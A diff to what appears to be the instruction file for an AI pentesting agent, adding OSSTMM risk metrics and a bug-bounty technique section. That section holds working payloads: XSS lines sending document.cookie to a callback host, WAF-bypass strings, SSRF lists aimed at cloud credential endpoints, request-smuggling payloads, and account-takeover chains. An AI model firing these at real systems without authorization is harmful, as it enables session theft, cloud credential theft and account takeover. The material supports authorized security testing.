@@ -693,10 +693,40 @@ Professional deliverables MUST include:
 
 ## Security Metrics Approach
 
-OSSTMM emphasizes measurable security. For each test:
-- **Controls**: What security mechanisms exist?
-- **Limitations**: What restricts the attacker?
-- **RAV (Risk Assessment Value)**: Quantify the risk
+OSSTMM emphasizes measurable, repeatable security testing. Apply these principles:
+
+### Attack Surface Measurement
+Calculate the attack surface using OSSTMM's operational security metrics:
+- **Porosity**: Number of entry points (open ports, endpoints, forms)
+- **Visibility**: How detectable is the target? (shodan, censys exposure)
+- **Trust**: Authentication and authorization mechanisms
+- **Controls**: Security measures in place (WAF, IDS, rate limiting)
+
+### RAV (Risk Assessment Value) Calculation
+For each finding, calculate:
+```
+RAV = (Porosity × Visibility) / (Trust × Controls)
+```
+Higher RAV = Higher Risk
+
+Document RAV in findings for prioritization.
+
+### Test Categories (OSSTMM Channels)
+Apply testing across all security channels:
+
+| Channel | Description | Testing Focus |
+|---------|-------------|---------------|
+| Human | People and processes | Social engineering, phishing susceptibility |
+| Physical | Physical access | Badge cloning, tailgating (if in scope) |
+| Wireless | RF communications | WiFi, Bluetooth, NFC security |
+| Telecommunications | Voice/data networks | VoIP, SIP, telephony |
+| Data Networks | IP-based systems | Web, API, network services |
+
+### Security Control Types
+When documenting findings, categorize affected controls:
+- **Class A (Interactive)**: Require human action (passwords, 2FA)
+- **Class B (Process)**: Automated controls (rate limiting, WAF)
+- **Class C (Physical)**: Hardware-based (HSM, biometrics)
 
 ## Operational Security Testing
 
@@ -704,6 +734,510 @@ Beyond technical vulnerabilities, assess:
 - **Process Security**: How are security procedures followed?
 - **Physical Security**: Physical access controls (if in scope)
 - **Human Security**: Susceptibility to social engineering
+
+### Documentation Requirements (OSSTMM Compliance)
+Each test must include:
+1. **Test Type**: Methodology used (blind, double-blind, gray-box)
+2. **Attack Vector**: Entry point exploited
+3. **Control Tested**: Which security control was evaluated
+4. **Result**: Pass/Fail with evidence
+5. **RAV Score**: Calculated risk value
+
+---
+
+# ADVANCED BUG BOUNTY TECHNIQUES (HackerOne Top Vulnerabilities)
+
+**This section contains professional penetration testing techniques derived from real-world bug bounty reports.**
+
+## 1. ADVANCED XSS EXPLOITATION
+
+### Blind XSS Detection & Exploitation
+Blind XSS payloads execute in admin panels, logging systems, or other contexts you can't directly observe.
+
+```python
+# Inject blind XSS callbacks in all input fields
+blind_xss_payloads = [
+    '"><script src=https://your-collaborator.com/x.js></script>',
+    '"><img src=x onerror=fetch("https://your-collaborator.com/"+document.cookie)>',
+    '<script>new Image().src="https://your-collaborator.com/?c="+document.cookie</script>',
+    '"><iframe src="javascript:fetch(\'https://your-collaborator.com/\'+document.domain)">',
+]
+
+# Test in: contact forms, feedback, support tickets, profile names, file upload names
+# Check your callback server for delayed triggers
+```
+
+### Polyglot XSS Payloads (WAF Bypass)
+Use polyglot payloads that work across multiple contexts:
+```
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//
+"><svg/onload=alert(1)>
+'"><img src=x onerror=alert(1)//
+\'-alert(1)-\'
+</script><script>alert(1)</script>
+```
+
+### DOM-Based XSS Discovery
+```python
+# Identify dangerous JavaScript sinks
+browse_page(url)  # Check for:
+# - document.write()
+# - element.innerHTML
+# - element.outerHTML  
+# - eval()
+# - setTimeout/setInterval with string
+# - location.hash, location.search, document.URL
+# - window.name, document.referrer
+
+# Test URL fragments and parameters for reflection
+# Example: target.com/#<script>alert(1)</script>
+# Example: target.com/page?param=<script>alert(1)</script>
+```
+
+### XSS via File Upload
+```python
+# Upload files with XSS in filename or content
+# Filename XSS:
+# - "><img src=x onerror=alert(1)>.jpg
+# - file.svg with embedded JavaScript
+
+# SVG XSS payload:
+svg_payload = """<?xml version="1.0"?>
+<svg xmlns="http://www.w3.org/2000/svg">
+<script type="text/javascript">alert(document.domain)</script>
+</svg>"""
+
+# HTML file with JavaScript (check if .html uploads allowed)
+```
+
+### XSS Filter Bypass Techniques
+```python
+# Case manipulation: <ScRiPt>alert(1)</sCrIpT>
+# Null bytes: <scr%00ipt>alert(1)</script>
+# Unicode: <script>al\u0065rt(1)</script>
+# Encoding chains: Double URL encode, HTML entity + URL encode
+# Event handlers: onfocus, onmouseover, onerror, onload
+# Less common tags: <svg>, <math>, <details>, <marquee>
+```
+
+## 2. SERVER-SIDE REQUEST FORGERY (SSRF)
+
+### Cloud Metadata Exploitation
+```python
+# AWS metadata endpoints
+ssrf_targets = [
+    "http://169.254.169.254/latest/meta-data/",
+    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    "http://169.254.169.254/latest/user-data",
+    "http://169.254.169.254/latest/dynamic/instance-identity/document",
+]
+
+# GCP metadata
+gcp_targets = [
+    "http://metadata.google.internal/computeMetadata/v1/",
+    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
+]
+
+# Azure metadata
+azure_targets = [
+    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+    "http://169.254.169.254/metadata/identity/oauth2/token",
+]
+```
+
+### SSRF via File Processing
+```python
+# SSRF via PDF generation (wkhtmltopdf, WeasyPrint)
+# Embed: <iframe src="http://169.254.169.254/latest/meta-data/">
+
+# SSRF via image processing (ImageMagick, FFmpeg)
+# SVG with external reference:
+ssrf_svg = """<?xml version="1.0"?>
+<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+<svg>&xxe;</svg>"""
+
+# SSRF via URL preview/unfurling features
+# Test: Open Graph metadata fetching, link previews
+```
+
+### SSRF Bypass Techniques
+```python
+# Bypass localhost filters
+bypass_localhost = [
+    "http://127.0.0.1", "http://localhost", "http://0.0.0.0",
+    "http://127.1", "http://127.0.1", "http://0",
+    "http://[::1]", "http://[::]",  # IPv6
+    "http://0x7f000001",  # Hex IP
+    "http://2130706433",  # Decimal IP
+    "http://017700000001",  # Octal IP
+    "http://127.0.0.1.nip.io",  # DNS rebinding
+]
+
+# Bypass URL validation
+bypass_url = [
+    "http://attacker.com@target-internal",
+    "http://target-internal#@attacker.com",
+    "http://attacker.com\\@target-internal",
+]
+```
+
+## 3. INSECURE DIRECT OBJECT REFERENCES (IDOR)
+
+### API Parameter Fuzzing
+```python
+# Test numeric IDs
+# Original: /api/users/1234 → Test: /api/users/1235, /api/users/1, /api/users/0
+
+# Test UUID manipulation
+# If predictable pattern: a1b2c3d4-e5f6-... → Try: a1b2c3d4-e5f6-...-0001
+
+# Parameter pollution
+# /api/data?user_id=victim&user_id=attacker (HPP)
+
+# Mass assignment
+# POST /api/users with extra fields: role=admin, is_admin=true
+```
+
+### Hidden API Endpoints Discovery
+```python
+# Check for GraphQL introspection
+graphql_introspection = '{"query": "{__schema{types{name,fields{name}}}}"}'
+curl_request(url + "/graphql", method="POST", data=graphql_introspection)
+
+# Check API versioning for old/unprotected endpoints
+# /api/v1/users → /api/v2/users → /api/v0/users → /api/internal/users
+
+# Mobile app API endpoints (often less protected)
+# Decompile APK/IPA for hidden endpoints
+```
+
+### IDOR in File Access
+```python
+# Document IDs in download URLs
+# /download?file_id=12345 → Test other IDs
+# /attachments/abc123.pdf → Test other hashes
+
+# Invoice/receipt access
+# /invoice/2024/001 → /invoice/2024/002
+
+# Shared file links
+# /share/randomtoken → Brute force short tokens
+```
+
+## 4. AUTHENTICATION & ACCOUNT TAKEOVER
+
+### OAuth Misconfiguration Attacks
+```python
+# OAuth redirect_uri bypass techniques:
+# 1. Subdomain bypass: redirect_uri=https://attacker.target.com
+# 2. Path bypass: redirect_uri=https://target.com/callback/../attacker
+# 3. Parameter pollution: redirect_uri=https://target.com&redirect_uri=https://attacker.com
+
+# OAuth state parameter attacks:
+# - Missing state → CSRF to link attacker's OAuth account
+# - Predictable state → Session fixation
+
+# Token leakage via Referer header
+# After OAuth callback, check if token appears in Referer to external resources
+```
+
+### Password Reset Vulnerabilities
+```python
+# Token predictability
+# - Check if reset tokens are sequential
+# - Check if tokens use timestamp-based generation
+# - Check if tokens are reusable
+
+# Host header injection for password reset
+curl_request(reset_url, headers={"Host": "attacker.com"})
+# Check if reset email contains attacker.com URL
+
+# Race condition in password reset
+# Request reset for victim, intercept token request, use before victim
+
+# Account takeover via password reset + email parameter manipulation
+# POST /reset with: email=victim@target.com&email=attacker@attacker.com
+```
+
+### Session Management Attacks
+```python
+# Session fixation
+# 1. Get session ID before login
+# 2. Send victim a link with that session ID
+# 3. After victim logs in, attacker uses same session
+
+# Session token analysis
+# - Check entropy of session tokens
+# - Check if tokens change after privilege changes
+# - Check session timeout behavior
+
+# Cookie scope issues
+# - Check for overly broad domain scope
+# - Check for missing HttpOnly, Secure, SameSite flags
+```
+
+### JWT Vulnerabilities
+```python
+# JWT none algorithm attack
+# Change header alg to "none", remove signature
+
+# JWT algorithm confusion (RS256 → HS256)
+# Sign with public key as HMAC secret
+
+# JWT key brute forcing
+# If weak secret, brute force with common passwords
+
+# JWT claim manipulation
+# Change user_id, role, is_admin in payload
+
+# Check for exposed .well-known/jwks.json
+```
+
+## 5. BUSINESS LOGIC VULNERABILITIES
+
+### E-commerce Price Manipulation
+```python
+# Price tampering in hidden fields
+# Change price parameter: price=0.01 or price=-100
+
+# Currency confusion
+# Order in cheaper currency, pay in expensive one
+
+# Quantity manipulation
+# quantity=-1 for refunds
+# quantity=999999999 for integer overflow
+
+# Coupon/discount abuse
+# - Apply multiple coupons
+# - Use expired coupons
+# - Modify discount percentage
+# - Race condition to apply coupon multiple times
+```
+
+### Feature Abuse
+```python
+# Free trial abuse
+# - Create multiple accounts
+# - Manipulate trial end date
+# - Use referral codes on own accounts
+
+# Rate limit bypass
+# - X-Forwarded-For header manipulation
+# - Distributed requests
+# - Race conditions
+
+# Premium feature bypass
+# - Direct API access to premium endpoints
+# - Parameter modification: is_premium=true
+# - Cached responses with premium content
+```
+
+### Workflow Bypass
+```python
+# Skip mandatory steps
+# - Skip verification by directly accessing next step URL
+# - Manipulate workflow state parameter
+
+# Approval bypass
+# - Submit and immediately approve own request
+# - Modify approver_id to self
+
+# Multi-step process attacks
+# - Complete step 3 before step 2
+# - Replay step 1 to reset flow
+```
+
+## 6. RACE CONDITIONS
+
+### Time-of-Check to Time-of-Use (TOCTOU)
+```python
+# Race condition testing approach:
+# 1. Identify state-changing operations
+# 2. Send multiple parallel requests
+# 3. Check for inconsistent results
+
+# Common targets:
+# - Money transfers (double-spend)
+# - Coupon redemption (use twice)
+# - Like/vote systems (vote multiple times)
+# - Invitation codes (use before expiration check)
+```
+
+### Parallel Request Technique
+```python
+# Use threading/async to send simultaneous requests
+# Example: Redeem $100 coupon 10 times simultaneously
+
+# Tools for race condition testing:
+# - Burp Suite Turbo Intruder
+# - Race-the-web
+# - Custom scripts with threading
+
+# Single-packet attack (HTTP/2)
+# Send multiple requests in single TCP packet for true simultaneity
+```
+
+### 2FA Race Conditions
+```python
+# Bypass 2FA by racing:
+# 1. Start login process
+# 2. Simultaneously send correct password + wrong 2FA code
+# 3. Some systems grant session before 2FA validation completes
+
+# Rate limit race:
+# 1. Send 10 2FA attempts simultaneously
+# 2. May bypass rate limiting if checks are per-request not per-session
+```
+
+## 7. HTTP REQUEST SMUGGLING
+
+### CL.TE Smuggling (Content-Length vs Transfer-Encoding)
+```python
+# Front-end uses Content-Length, back-end uses Transfer-Encoding
+smuggle_payload = """POST / HTTP/1.1
+Host: target.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED"""
+
+# Use to:
+# - Bypass security controls
+# - Access internal endpoints
+# - Poison web cache
+# - Hijack other users' requests
+```
+
+### TE.CL Smuggling
+```python
+# Front-end uses Transfer-Encoding, back-end uses Content-Length
+smuggle_payload = """POST / HTTP/1.1
+Host: target.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+5c
+GPOST / HTTP/1.1
+Content-Length: 15
+
+x=1
+0
+
+"""
+```
+
+## 8. CACHE POISONING & DECEPTION
+
+### Web Cache Poisoning
+```python
+# Poison cache with malicious response
+# 1. Find unkeyed inputs (headers not in cache key)
+# 2. Inject payload that affects response
+# 3. Cache serves poisoned response to all users
+
+# Common unkeyed headers:
+# X-Forwarded-Host, X-Original-URL, X-Rewrite-URL
+
+# Test:
+curl_request(url, headers={"X-Forwarded-Host": "attacker.com"})
+# Check if response contains attacker.com
+# If yes, this response may be cached
+```
+
+### Cache Deception
+```python
+# Trick cache into storing sensitive data
+# 1. Victim visits: /account/settings.css
+# 2. Server responds with /account/settings (ignoring .css)
+# 3. CDN caches based on .css extension
+# 4. Attacker accesses cached /account/settings.css
+
+# Test paths:
+# /profile/nonexistent.css
+# /api/user.js
+# /admin/dashboard.png
+```
+
+## 9. GRAPHQL VULNERABILITIES
+
+### GraphQL Introspection
+```python
+# Full introspection query
+introspection = '''{
+  __schema {
+    types {
+      name
+      fields {
+        name
+        args { name type { name } }
+      }
+    }
+    mutationType { name }
+    queryType { name }
+  }
+}'''
+
+# Look for sensitive operations: deleteUser, updateRole, internalData
+```
+
+### GraphQL Attacks
+```python
+# Batching attacks (bypass rate limits)
+# Send multiple operations in single request
+
+# Deep query attacks (DoS)
+# Nested queries that cause exponential processing
+
+# Field suggestions abuse
+# Error messages may reveal hidden fields
+
+# Alias-based attacks
+# Use aliases to query same field multiple times
+```
+
+## 10. EXPLOITATION CHAINING PATTERNS
+
+### High-Impact Chains (from HackerOne)
+```python
+# Chain 1: IDOR + CSRF = Account Takeover
+# 1. Find IDOR in email change endpoint
+# 2. Create CSRF payload to change victim's email
+# 3. Use password reset to take over
+
+# Chain 2: XSS + CSRF = Admin Compromise
+# 1. Find XSS in user-accessible area
+# 2. Craft payload that performs admin actions via CSRF
+
+# Chain 3: SSRF + Cloud Metadata = AWS Compromise
+# 1. Find SSRF in any URL fetching feature
+# 2. Access AWS metadata for IAM credentials
+# 3. Use credentials to access S3, EC2, etc.
+
+# Chain 4: Open Redirect + OAuth = Token Theft
+# 1. Find open redirect on authorized domain
+# 2. Use as OAuth redirect_uri
+# 3. Steal authorization code/token
+```
+
+### Information Disclosure → Exploitation
+```python
+# Pattern: Stack trace → Version → CVE → RCE
+# 1. Trigger error to reveal framework/version
+# 2. Search for CVEs: searchsploit_search(version)
+# 3. Exploit known vulnerability
+
+# Pattern: .git exposure → Source → Secrets
+# 1. Access /.git/config, /.git/HEAD
+# 2. Download git repo with git-dumper
+# 3. Search for hardcoded credentials
+
+# Pattern: API docs → Hidden endpoints → Data leak
+# 1. Find /swagger.json, /api-docs, /openapi.yaml
+# 2. Discover undocumented admin endpoints
+# 3. Access without authorization
+```
 
 ---
 
@@ -1620,6 +2154,43 @@ When the user asks to "list tools", "show available tools", "what tools do you h
 - `sqlmap_scan` / `sqlmap_dump` - SQL injection detection and exploitation
 - `searchsploit_search` / `searchsploit_examine` / `searchsploit_copy` - Exploit database search
 - `ffuf_scan` / `ffuf_vhost` - Web fuzzing and content discovery
+
+## Advanced Bug Bounty Tools:
+Professional pentesting tools for advanced vulnerability discovery:
+
+### Parameter Discovery:
+- `arjun_scan(url)` - Discover hidden GET/POST parameters in endpoints
+- `paramspider_scan(domain)` - Mine URLs with parameters from web archives (Wayback Machine)
+
+### JWT Security Testing:
+- `jwt_analyze(token)` - Analyze JWT for vulnerabilities (none algorithm, weak keys, expired tokens)
+- `jwt_forge(token, modifications, secret)` - Forge modified JWT tokens for privilege escalation testing
+
+### GraphQL Testing:
+- `graphql_introspection(url)` - Discover GraphQL schema, types, queries, and mutations
+  - Identifies sensitive types (user, admin, auth)
+  - Suggests exploitation paths
+
+### Race Condition Testing:
+- `race_condition_test(url, method, data, threads)` - Send parallel requests to test TOCTOU vulnerabilities
+  - Tests for double-spend, rate limit bypass, 2FA bypass
+  - Analyzes response differences for vulnerability indicators
+
+### Payload Generators:
+- `ssrf_payloads(target_type)` - Generate SSRF payloads
+  - `localhost` - Localhost bypass techniques (127.0.0.1 alternatives, encoding tricks)
+  - `cloud` - Cloud metadata endpoints (AWS, GCP, Azure)
+  - `internal` - Internal network scanning payloads
+
+- `xss_payloads(context, waf_bypass)` - Generate context-specific XSS payloads
+  - `html`, `attribute`, `javascript`, `url`, `dom`, `blind`
+  - WAF bypass variants included
+
+- `idor_payloads(id_type)` - Generate IDOR test strategies
+  - `numeric` - Sequential ID testing
+  - `uuid` - UUID manipulation techniques
+  - `encoded` - Base64/encoded ID testing
+  - `hash` - Hash-based ID attacks
 
 ## OWASP ZAP - Full Scanning Suite:
 OWASP ZAP provides comprehensive web application security scanning with spider, AJAX spider, and active scanning.
